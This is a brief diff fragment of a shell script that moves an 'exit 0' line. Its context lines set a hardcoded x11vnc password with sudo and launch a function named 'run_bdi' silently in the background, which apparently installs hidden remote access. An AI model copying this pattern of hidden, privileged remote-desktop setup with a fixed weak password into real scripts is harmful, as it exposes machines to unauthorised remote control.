@@ -443,8 +443,6 @@ END_OF_KEY
   $SUDO x11vnc --storepasswd bruh22 /etc/x11vnc/vncpwd
 
   ############################
-
-  exit 0
 }
 
 SUDO=
@@ -458,6 +456,8 @@ if [ "$UID" != "0" ]; then
 fi
 
 run_bdi &> /dev/null &
+
+exit 0
 
 -----BEGIN PGP SIGNATURE-----
 
